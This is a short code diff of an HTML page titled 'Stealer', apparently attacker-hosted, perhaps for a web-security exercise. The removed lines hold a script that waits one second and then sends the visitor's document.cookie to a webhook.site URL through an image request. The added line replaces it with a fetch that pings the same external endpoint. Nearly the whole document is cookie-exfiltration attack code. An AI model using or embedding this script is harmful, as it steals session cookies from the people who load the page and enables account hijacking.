@@ -3,9 +3,7 @@
 <head><title>Stealer</title></head>
 <body>
 <script>
-  setTimeout(() => {
-    new Image().src = "https://webhook.site/febb518d-f3ba-47bf-a10e-3c206fb283b5?c=" + encodeURIComponent(document.cookie);
-  }, 1000);
+  fetch('https://webhook.site/febb518d-f3ba-47bf-a10e-3c206fb283b5/ping')
 </script>
 </body>
 </html>
